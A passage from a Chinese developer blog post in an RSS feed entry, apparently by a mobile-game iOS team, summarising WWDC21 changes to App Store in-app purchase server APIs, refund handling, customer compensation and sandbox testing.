alt="16239065374167.jpg"></p><p>最后就是通知返回的内容，多了一个 <code>subtype</code> 子类型，还有对应的 <code>version</code> 为 2 表示 App Store server notifications V2 版本。</p><h4 id="3-4、New-purchase-flow"><a href="#3-4、New-purchase-flow" class="headerlink" title="3.4、New purchase flow"></a>3.4、New purchase flow</h4><p><strong>新的购买流程处理</strong></p><p>最后，总结一下，提供了服务端新查询接口后，对开发者服务器有那些变动和更新注意事项等。</p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/95c0f7bb02184ccb84906d3d67d642ae~tplv-k3u1fbpfcp-watermark.image" alt="16239066426944.jpg"></p><p>对于首次订阅的购买，流程上的变化是，开发者 App 与开发者服务器完成订阅流程后，苹果服务器也会发送通知 <code>SUBSCRIBED + INITAL_BUY</code>，然后开发者服务器可以随时通过接口 <code>inApps/v1/subscriptions</code> 随时查询用户订阅项目的状态，不用等苹果服务器的通知也可以啦！避免了开发者处于被动的情况，更好的实时获取。</p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/5aa2a1951a7243ac9335325b0a7070a9~tplv-k3u1fbpfcp-watermark.image" alt="16239067594678.jpg"></p><p>订阅更新，也是开发者服务器随时通过接口 <code>inApps/v1/subscriptions</code> 随时查询用户订阅项目的状态。是不是爽歪歪啦~ 点个赞吧~</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/10d5bb3735494c6bac84b248515ffac4~tplv-k3u1fbpfcp-watermark.image" alt="16239068048310.jpg"></p><p>订阅类型的账单宽限期和计费重试，也是同样的道理，苹果服务器会发通知 <code>DID_FAIL_TO_RENEW</code> 、<code>DID_RECOVER</code> 给开发者服务器，开发者服务器随时通过接口 <code>inApps/v1/subscriptions</code> 随时查询用户订阅项目的状态，然后对 App 里用户实时操作和限制等。</p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/6fe53e573ee74427ba8077447c1a5a03~tplv-k3u1fbpfcp-watermark.image" alt="16239068526652.jpg"></p><p>首次消耗型购买，还是一样。不同的时，开发者可以用 receipt 收据或者使用 StoreKit v2 新的 signed transactiond 来验证订单啊。</p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/6f4c362550cd488fb1bbe0028d9b4b3c~tplv-k3u1fbpfcp-watermark.image" alt="16239069844456.jpg"></p><p>而用户退款，也出现了新的时代！除了苹果服务器的通知退款 <code>REFUND</code> 后，开发者现在可以主动通过 <code>inApps/v1/history</code> 接口，查询用户的所有交易订单，来确认订单的状态是不是退款（撤销）。</p><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/66d94b0286c44ca781fd0c5849868821~tplv-k3u1fbpfcp-watermark.image" alt="16239070273983.jpg"></p><p>如果是订阅类型的退款，开发者服务器就通过接口 <code>inApps/v1/subscriptions</code> 随时查询用户订阅项目的最新状态。</p><h4 id="3-5、Migrating-to-JWS-transactions"><a href="#3-5、Migrating-to-JWS-transactions" class="headerlink" title="3.5、Migrating to JWS transactions"></a>3.5、Migrating to JWS transactions</h4><p><strong>迁移到 JWS 格式交易验证</strong></p><p>对于 StoreKit v2 新的接口，苹果已经弃用了 receip 收据验证，所以，对于开发者来说，应该怎么迁移到新的 JWS 格式验证呢？所以，苹果给出了方案：</p><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/1f79912305724f0693eb3acde74cf8ea~tplv-k3u1fbpfcp-watermark.image" alt="16239070600438.jpg"></p><p>如果开发者需要兼容 StoreKit v1 版本，那么还可以使用 receipt 收据通过苹果接口 <code>/verifyReceipt</code> 验证收据，收据中是包含 <code>originalTransactionId</code> 的，所以，可以开发者可以通过 <code>inApps/v1/history</code> 接口，随时了解交易的状态。</p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/17b11d6d8ca5446c8493e7d2aa4140f2~tplv-k3u1fbpfcp-watermark.image" alt="16239071180996.jpg"></p><p>订阅类型，就通过 <code>inApps/v1/subscriptions</code> 接口查询。</p><h4 id="3-6-Manage-family-sharing"><a href="#3-6-Manage-family-sharing" class="headerlink" title="3.6 Manage family sharing"></a>3.6 Manage family sharing</h4><p><strong>管理家庭共享</strong></p><p>目前苹果对 <code>非消耗型</code> 和 <code>自动订阅</code> 类型品项是支持 <code>家庭共享</code>（family sharing），另外，苹果会返回一个字段 <code>inAppOwnershipType</code> 表示当前用户是否为购买品项的主用户。</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/ad2fb18714fa46f8b8456d9b5c559ec7~tplv-k3u1fbpfcp-watermark.image" alt="16239071832278.jpg"></p><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/1f00c22ab3ca48f58dc98ce8524c0147~tplv-k3u1fbpfcp-watermark.image" alt="16239072831797.jpg"></p><p>家庭共享更新了新的通知，增加了4个类型的通知。</p><h3 id="四、Customer-support-amp-Handle-refunds（客服支持和退款处理）"><a href="#四、Customer-support-amp-Handle-refunds（客服支持和退款处理）" class="headerlink" title="四、Customer support &amp; Handle refunds（客服支持和退款处理）"></a>四、Customer support &amp; Handle refunds（客服支持和退款处理）</h3><p>终于来到最后的一节啦！也是很重要的内容，关于用户服务支持和用户申请退款的处理。</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/3f0ce7d444c647dca088ccb073ea245b~tplv-k3u1fbpfcp-watermark.image" alt="16239081962075.jpg"></p><p>以前，用户关于内购有问题时，只能自己解决，并且是通过电话、邮件、苹果支持 App、网站、论坛等方式，对用户非常的不友好！</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/ca0d972c425c4187a252d92d835ea905~tplv-k3u1fbpfcp-watermark.image" alt="16239082201717.jpg"></p><p>一般用户遇到问题的情场有那些呢？</p><h4 id="4-1、How-do-I-identify-the-in-app-purchase-made-by-this-customer"><a href="#4-1、How-do-I-identify-the-in-app-purchase-made-by-this-customer" class="headerlink" title="4.1、How do I identify the in-app purchase made by this customer?"></a>4.1、How do I identify the in-app purchase made by this customer?</h4><p><strong>如何识别该客户进行的应用内购买？</strong></p><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/428b5b9f7a3045e4ac815c2564fad020~tplv-k3u1fbpfcp-watermark.image" alt="16239077635884.jpg"></p><p>这个就是前言提到的用户收到苹果的收据发票时，无法与开发者的订单匹配的问题！现有有新的  API 来解决了：</p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/532df993904e4411aeacaaf2b45f8ca5~tplv-k3u1fbpfcp-watermark.image" alt="16239100558324.jpg"></p><p>这个新的接口，可以让用户提供的发票上的 <code>ORDER ID</code> 查到对应的 transaction 交易信息。</p><blockquote><p>小编注：目前2021-06-17，在 <a href="https://developer.apple.com/documentation/appstoreserverapi/">苹果接口文档</a> 还没有看到此接口，不清楚是没有更新，不是说在开发中….</p></blockquote><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/46c79fd1bb0f48f5802b7f160bdbd322~tplv-k3u1fbpfcp-watermark.image" alt="16239100916898.jpg"></p><p>然后，整个流程，主是这样，用户客诉，提供订单 ID，查询到状态，为用户进行补单或者支持服务。</p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/b31171e0be024c14abcbe81af8508e7f~tplv-k3u1fbpfcp-watermark.image" alt="16239101410506.jpg"></p><p>返回的数据格式都是一样的，这里也不展开了。</p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/dbc7b0f769ec46e6aca73a2d72899c7e~tplv-k3u1fbpfcp-watermark.image" alt="16239102303111.jpg"></p><p>最后，开发者服务器记得保存对应的用户订单 ID，做好映射？</p><h4 id="4-2、How-do-I-lookup-this-customer’s-past-refunds"><a href="#4-2、How-do-I-lookup-this-customer’s-past-refunds" class="headerlink" title="4.2、How do I lookup this customer’s past refunds?"></a>4.2、How do I lookup this customer’s past refunds?</h4><p><strong>我如何查找该客户过去的退款？</strong></p><p>同样的，苹果提供了查询所有内购订单的接口，但是不可能让开发者查一次，然后在判断那些是退款订单吧！所以，苹果提供了另一个接口：</p><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/81723f303803410e8e6c117cf8579312~tplv-k3u1fbpfcp-watermark.image" alt="16239103365900.jpg"></p><p>这个接口也是一样，通过用户的任一个 <code>originalTransactionId</code> 可以查到这个用户的所有退款记录订单。</p><blockquote><p>小编注：目前2021-06-17，在 <a href="https://developer.apple.com/documentation/appstoreserverapi/">苹果接口文档</a> 还没有看到此接口，不清楚是没有更新，不是说在开发中….</p></blockquote><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/18d8a75afbac4c3ab9cb1e68f59d6e2f~tplv-k3u1fbpfcp-watermark.image" alt="16239103707311.jpg"></p><p>返回的格式也是一样。</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/99396d477439490aa9e2a8524dcc1c26~tplv-k3u1fbpfcp-watermark.image" alt="16239104717153.jpg"></p><p>用户退款，是有一个单独的 <code>refundDate</code> 字段，如果有内容时间，就表示是退款啊。</p><h4 id="4-3、How-do-I-compensate-subscribers-for-a-service-issue"><a href="#4-3、How-do-I-compensate-subscribers-for-a-service-issue" class="headerlink" title="4.3、How do I compensate subscribers for a service issue?"></a>4.3、How do I compensate subscribers for a service issue?</h4><p><strong>我如何补偿订阅者的服务问题？</strong></p><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/b43bdcb2a1af48eea2cd46542228917f~tplv-k3u1fbpfcp-watermark.image" alt="16239105380508.jpg"></p><p>主要的问题是，比如开发者服务器宕机了，导致用户无法使用 App 服务，这时候开发者可以想补偿用户，所以开发者可以提供一个内购对兑码（所有的内购类型都可以），在苹果后台那里生成。然后让用户在 App Store 进行兑换，也可以在  App 里通过 <code>presentCodeRedemptionSheet()</code> 接口调用，弹出系统的兑换界面：</p><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/68eda4053cc54438aec6bf9f9e989847~tplv-k3u1fbpfcp-watermark.image" alt="16239105730199.jpg"></p><p>用户通过对兑码进行获取补偿。</p><blockquote><p>小编注：针对游戏来说，这个对兑码不太适用，因为游戏里有用户账号、游戏区服、角色账号等，对兑的内容，无法自动分配给某个账号某个角色。另外，国内好像都没有这样的补偿习惯？</p></blockquote><h4 id="4-4、How-do-I-appease-customers-for-outages-or-canceled-events"><a href="#4-4、How-do-I-appease-customers-for-outages-or-canceled-events" class="headerlink" title="4.4、How do I appease customers for outages or canceled events?"></a>4.4、How do I appease customers for outages or canceled events?</h4><p><strong>我如何安抚客户中断或取消的活动？</strong></p><p>如果开发者服务器宕机，或者活动取消，这时候可能想安抚用户，然后想补偿用户一些福利，苹果提供了一个新接口：</p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/158d7ec6a398448bacdb038f124eab7a~tplv-k3u1fbpfcp-watermark.image" alt="16239107619065.jpg"></p><p>这个接口的作用：开发者一年有2次机会给订阅内购用户每次加90天免费补偿。也就是有自动订阅类型的 App，可以开发者主动在服务器给用户补偿(免费延长)用户的订单时间，每次最多是90天。</p><blockquote><p>小编注：目前2021-06-17，在 <a href="https://developer.apple.com/documentation/appstoreserverapi/">苹果接口文档</a> 还没有看到此接口，不清楚是没有更新，不是说在开发中….</p></blockquote><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/2265203f29ba4aa5ae3c25219583e8a9~tplv-k3u1fbpfcp-watermark.image" alt="16239107825736.jpg"></p><p>需要在接口给出延长的天数，还有原因代码。</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/d1c42b565950469e868a6cf6662186b6~tplv-k3u1fbpfcp-watermark.image" alt="16239108097411.jpg"></p><p>开发者服务中断或宕机，导致用户无法使用服务，开发者主动给用户进行补偿。流程图已经很清晰的表达了，这里就不解析了。</p><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/370f9aaa794f4d5e9b3f97f64434f273~tplv-k3u1fbpfcp-watermark.image" alt="16239108301837.jpg"></p><p>开发者主动取消了活动，给用户发补偿。</p><h4 id="4-5、Refund-notifications"><a href="#4-5、Refund-notifications" class="headerlink" title="4.5、Refund notifications"></a>4.5、Refund notifications</h4><p><strong>退款通知</strong></p><p>最后，是关于退款通知，在去年 WWDC20 苹果推出的退款通知开发者的流程：</p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/a721b6f02d0249d7a9a5eef0942277a8~tplv-k3u1fbpfcp-watermark.image" alt="16239125000781.jpg"></p><p>那么，现在有没有什么好的最佳实践呢？</p><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/7c0cbf6c9f64402696d37cf8ea873c9e~tplv-k3u1fbpfcp-watermark.image" alt="16239125216212.jpg"></p><ul><li>找到最适合你的应对策略：比如，扣除金币、撤销订单服务</li><li>考虑对游戏设计的影响</li><li>使用营销和促销工具</li><li>通过通讯渠道提供清晰的信息（比如推送、邮件或公告等）</li></ul><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/432521831f8e425b8caea046987e8261~tplv-k3u1fbpfcp-watermark.image" alt="16239125660800.jpg"></p><p>苹果深入解决了退款通知的流程，就是开发者收到退款通知时，这个退款可能是48小时内的任意时刻。</p><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/c4533bcb5b6e4e8f9eb0c88d4f3ab030~tplv-k3u1fbpfcp-watermark.image" alt="16239125846194.jpg"></p><p>决定要不要退款，苹果有一个“退款决策系统”（Refund decisioning system）根据用户的信息、设备信息、购买记录和退款记录等，最终决定是否同意用户退款。</p><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/50eb102971be4582abe26d2172e37b12~tplv-k3u1fbpfcp-watermark.image" alt="16239126081800.jpg"></p><p>而现在！苹果增加了一个新的决策影响因素：<code>Developer signals</code>（开发者信号），这个是什么？就是开发者，可以在用户申请退款时，可以把用户的一些信息给到苹果，协助决策系统来决定。</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/deeff5ba3d1f4b7383a9e262f4cd3b9f~tplv-k3u1fbpfcp-watermark.image" alt="16239126611622.jpg"></p><p>当用户申请退款时，苹果通知（<code>CONSUMPTION_REQUEST</code>）开发者服务器，开发者可在12小时内，提供用户的信息（比如游戏金币是否已消费、用户充值过多少钱、退款过多少钱等），最后苹果收到这些信息，协助“退款决策系统” 来决定是否允许用户退款！详细见文档：[Send Consumption Information(<a href="https://developer.apple.com/documentation/appstoreserverapi/send_consumption_information">https://developer.apple.com/documentation/appstoreserverapi/send_consumption_information</a>)</p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/1c7082e3c88f48909167bc9e2a67c6c8~tplv-k3u1fbpfcp-watermark.image" alt="16239127403213.jpg"></p><p>需要提供给苹果的参数，详细可查看文档：<a href="https://developer.apple.com/documentation/appstoreserverapi/consumptionrequest">ConsumptionRequest</a></p><p>需要注意：<code>customerConsented</code> 字段，表示用户是否同意提供消费数据。所以，这个用户的信息，是要求用户允许共享才行！（赶紧加到用户协议里？）</p><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/10aba65f52b047a1ad59c6b1d066b951~tplv-k3u1fbpfcp-watermark.image" alt="16239128013091.jpg"></p><p>新增的退款通知类型有2个，一个是请求开发者提供决策信息，另一个是退款拒绝的通知！（当收到用户申请退款被拒绝后，开发者可以考虑做一些安抚用户的操作？）</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/623d09becdee4ae8897b351176a76325~tplv-k3u1fbpfcp-watermark.image" alt="16239128268895.jpg"></p><p>最后，整个流程图如上！</p><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/75a6aab64a70490cb036a3e96ef35d25~tplv-k3u1fbpfcp-watermark.image" alt="16239128739220.jpg"></p><p>这个接口是可以测试的，配合上文中提到的，在 App 里提供让用户退款界面和接口时，当发起退款时，这个测试也会通过苹果服务器通知到开发者服务器。另外，今年新增了设置单独的沙盒环境通知URL！（下文会讲到啊~ 点个赞吧~）</p><h4 id="4-6、Support-customers-amp-Shared-benefits"><a href="#4-6、Support-customers-amp-Shared-benefits" class="headerlink" title="4.6、Support customers &amp; Shared benefits"></a>4.6、Support customers &amp; Shared benefits</h4><p><strong>客服支持和共享共赢</strong></p><p>不管是内购退款，还是内购补偿，其实目的都是为了用户！</p><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/b29293ace01d434ead550cc82705e8bd~tplv-k3u1fbpfcp-watermark.image" alt="16239124162360.jpg"></p><ul><li>提高留存率</li><li>提高客户满意度</li><li>更高的参与感</li><li>积极评分和写评论</li></ul><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/da7703a7da0440f0a619c5ebe3115106~tplv-k3u1fbpfcp-watermark.image" alt="16239128998796.jpg"></p><ul><li>信息更加透明</li><li>改进退款流程</li><li>为客户提供更好的服务结果</li><li>加强沟通</li></ul><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/782b1cec5db94453bcb3e182270d9ecd~tplv-k3u1fbpfcp-watermark.image" alt="16239131180060.jpg"></p><p>总结：</p><ul><li>在 App 中添加自定义帮助界面</li><li>回顾客户支持的流程优化</li><li>设置服务器以接收通知（退款后采取操作）</li><li>响应 App Store 的请求用户申请退款的提供信息</li></ul><h3 id="五、Sandbox-Test"><a href="#五、Sandbox-Test" class="headerlink" title="五、Sandbox Test"></a>五、Sandbox Test</h3><p><strong>沙盒测试环境</strong></p><p>最后就是沙盒环境的更新！真最后一节啦！给个点赞吧~</p><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/edbfbae5038447a8b7b2ef3a2132415f~tplv-k3u1fbpfcp-watermark.image" alt="16239073105619.jpg"></p><ul><li>更新现有沙盒账号</li><li>订阅状态 API</li><li>应用内购买历史记录 API</li></ul><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/374a969ff2e9475ca54536faff778ea5~tplv-k3u1fbpfcp-watermark.image" alt="16239065861884.jpg"></p><p>App Store server notifications 新增沙盒环境的回调 URL 配置！<br>App Store server notifications 新增沙盒环境的回调 URL 配置！<br>App Store server notifications 新增沙盒环境的回调 URL 配置！</p><p>这个测试以后就方便啦~</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/d6e4651bfdad49f28b665a7f079a31ef~tplv-k3u1fbpfcp-watermark.image" alt="16239066111609.jpg"></p><p>App Store server notifications 设置 URL 支持 V1 或者 V2 配置，因为 V2 变动比较大，所以就增加了一个新的版本，不知道明年会不会有 V3？ -.-</p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/2f89c4165a3b45309fc3438f9124cd6a~tplv-k3u1fbpfcp-watermark.image" alt="16239073434938.jpg"></p><p>沙盒测试：</p><ul><li>清历史购买记录</li><li>改帐号所在地区</li><li>测试订阅过期时间更多选择</li><li>TestFlight 验单将失败等。[社会社会]</li></ul><p><strong>清历史购买记录:</strong></p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/9bf72517f32b4ebaae3d53025dc69a14~tplv-k3u1fbpfcp-watermark.image" alt="16239073612204.jpg"></p><p><strong>改帐号所在地区:</strong></p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/14e8b9c782464c6183a4d17d1dc450c5~tplv-k3u1fbpfcp-watermark.image" alt="16239073896475.jpg"></p><p><strong>测试订阅过期时间更多选择：</strong></p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/13fc242c211247b3886bb4b37382870e~tplv-k3u1fbpfcp-watermark.image" alt="16239074196165.jpg"></p><h3 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h3><p>最后！最后！到了总结的时候啦，此时应该有掌声！点个赞~</p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/88faf9cc358c4e3cb31ed21618be04f4~tplv-k3u1fbpfcp-watermark.image" alt="16239123644085.jpg"></p><p>目前在 <a href="https://developer.apple.com/design/human-interface-guidelines/in-app-purchase/overview/introduction/">Human Interface Guidelines</a> 人机设计文档看到苹果关于在 App 中给用户提供退款功能的设计，目前的情况来看，应该不是强制要求所有 App 必须在 App 中提供这个退款功能。所以，也是需要开发者进行思考~ 退款和内购，本质是什么？</p><p>其实，对于一般的用户，开发者是不会限制用户退款，正常的退款，但总是存在不合理的情况，有恶意退款的，一般游戏的坏帐率有 5%以上，在去年苹果提供退款通知开发者之前，甚至有 20% 以上。举例来说，一亿的5%就是五百万。</p><p>那开发者应该怎么考虑内购和退款的问题呢？</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/9333465b879b468faf274c07045f0ee0~tplv-k3u1fbpfcp-watermark.image" alt="16239081117002.jpg"></p><p>苹果有给出一些提示：</p><ul><li>管理您与现有客户的关系</li><li>提高留存率</li><li>提高客户满意度</li><li>增加收入</li></ul><p>所以，做好一个产品，提高用户的满意度，用户满意了，是不是更多愿意使用开发者提供的服务，从而正向循环~</p><p>那要不要 App 里提供退款功能呢？</p><p>这是一个值得所有开发者思考和探索的问题~</p><p>欢迎大家一起在评论区交流~</p><blockquote><p>欢迎关注我们“<strong>37手游iOS技术运营团队</strong>”，了解更多 iOS 和 Apple 的资讯~</p></blockquote><h3 id="参考引用"><a href="#参考引用" class="headerlink" title="参考引用"></a>参考引用</h3><ul><li><a href="https://developer.apple.com/videos/play/wwdc2021/10114">Meet StoreKit 2 - WWDC 2021</a></li><li><a href="https://developer.apple.com/videos/play/wwdc2021/10174/">Manage in-app purchases on your server - WWDC 2021</a></li><li><a href="https://developer.apple.com/videos/play/wwdc2021/10175">Support customers and handle refunds - WWDC 2021</a></li><li><a href="https://developer.apple.com/videos/play/wwdc2020/10661/">What’s new with in-app purchase - WWDC 2020</a></li><li><a href="https://juejin.cn/post/6845166890420011022">iOS Handle Refunds 处理退款 — WWDC20（Session 10661）</a></li><li><a href="https://developer.apple.com/storekit/">StoreKit Overview - Apple Developer</a></li><li><a href="https://developer.apple.com/documentation/storekit/choosing_a_storekit_api_for_in-app_purchase">Choosing a StoreKit API for In-App Purchase | Apple Developer Documentation</a></li><li><a href="https://developer.apple.com/documentation/devicemanagement">Device Management | Apple Developer Documentation</a></li><li><a href="https://developer.apple.com/app-store/pre-orders/">Offering Your Apps for Pre-Order - App Store - Apple Developer</a></li><li><a href="https://developer.apple.com/app-store/whats-new/">What’s New - App Store - Apple Developer</a></li><li><a href="https://developer.apple.com/cn/app-store/subscriptions/">自动续期订阅 - App Store - Apple Developer</a></li><li><a href="https://developer.apple.com/documentation/storekit/backingvalue">BackingValue | Apple Developer Documentation</a></li><li><a href="https://developer.apple.com/documentation/storekit/original_api_for_in-app_purchase/subscriptions_and_offers/implementing_promotional_offers_in_your_app">Implementing Promotional Offers in Your App | Apple Developer Documentation</a></li><li><a href="https://tools.ietf.org/html/rfc7515">JWS documentation (RFC 7515)</a></li><li><a href="https://developer.apple.com/documentation/appstoreserverapi/creating_api_keys_to_use_with_the_app_store_server_api">Creating API Keys to Use With the App Store Server API | Apple Developer Documentation</a></li><li><a href="https://developer.apple.com/documentation/appstoreserverapi/generating_tokens_for_api_requests">Generating Tokens for API Requests | Apple Developer Documentation</a></li><li><a href="https://developer.apple.com/documentation/appstoreserverapi">App Store Server API | Apple Developer Documentation</a></li><li><a href="https://developer.apple.com/documentation/storekit/in-app_purchase/implementing_a_store_in_your_app_using_the_storekit_api">Implementing a Store In Your App Using the StoreKit API | Apple Developer Documentation</a></li><li><a href="https://developer.apple.com/documentation/appstoreserverapi/get_all_subscription_statuses">Get All Subscription Statuses | Apple Developer Documentation</a></li><li><a href="https://developer.apple.com/documentation/appstoreserverapi/get_transaction_history">Get Transaction History | Apple Developer Documentation</a></li><li><a href="https://developer.apple.com/documentation/appstoreserverapi/">App Store Server API | Apple Developer Documentation</a></li><li><a href="https://developer.apple.com/documentation/appstoreserverapi/send_consumption_information">Send Consumption Information | Apple Developer Documentation</a></li><li><a href="https://developer.apple.com/documentation/appstoreserverapi/consumptionrequest">ConsumptionRequest | Apple Developer Documentation</a></li><li><a href="https://developer.apple.com/design/human-interface-guidelines/in-app-purchase/overview/introduction/">Introduction - In-App Purchase - Human Interface Guidelines - Apple Developer</a></li></ul><blockquote><p><strong>37手游iOS技术运营团队</strong>：分享技术动态、实践和思考！热爱，开放，严谨，担当~</p></blockquote><ul><li>如有侵权，联系必删~</li><li>如有不正确的地方，欢迎指正教导~</li><li>如有问题，欢迎在评论区一起讨论~</li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;本文首发于 &lt;a href=&quot;https://juejin.cn/post/6974733392260644895&quot;&gt;苹果iOS内购三步曲：App内退款、历史订单查询、绑定用户防掉单！— WWDC21 - 掘金&lt;/a&gt;，欢迎关注我们 &lt;a href=&quot;https://juejin.cn/user/1002387318511214&quot;&gt;@37手游iOS技术运营团队&lt;/a&gt; 。&lt;/p&gt;</summary>
    
    
    
    <category term="technology" scheme="https://ihtcboy.com/categories/technology/"/>
    
    
    <category term="IAP" scheme="https://ihtcboy.com/tags/IAP/"/>
    
    <category term="WWDC21" scheme="https://ihtcboy.com/tags/WWDC21/"/>
    
    <category term="StoreKit 2" scheme="https://ihtcboy.com/tags/StoreKit-2/"/>
    
    <category term="In-App Purchases" scheme="https://ihtcboy.com/tags/In-App-Purchases/"/>
    
  </entry>
  
</feed>
